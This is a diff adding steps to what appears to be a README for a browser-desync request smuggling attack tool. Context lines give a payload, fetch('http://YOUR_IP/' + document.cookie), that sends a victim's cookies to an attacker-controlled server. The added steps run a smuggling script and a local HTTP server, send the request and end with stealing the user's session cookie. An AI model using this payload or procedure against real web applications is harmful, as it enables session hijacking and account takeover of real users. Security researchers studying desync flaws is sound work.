@@ -48,3 +48,17 @@ AAA: A">placeholder1</textarea>
 ### To summarize, this gadget operates by using the initial request to position the victim within the connection context of the vulnerable server. The following request retrieves the malicious payload, compromising the victim's session.
 
 ### To do so, we can set up a rogue server by serving a route with a malicious payload like fetch('http://YOUR_IP/' + document.cookie);
+
+### Steps to exploit a vulnerable application:
+
+#### 1) Use straightforward payload to test for browser desync vulnerability
+
+#### 2) Type in the form included to the vulnerable part of the application
+
+#### 3) sudo python3 smugglingserver.py
+
+#### 4) sudo python3 -m http.server 8080
+
+#### 5) Send the request
+
+#### 6) After one minute or so, we steal the user's session cookie
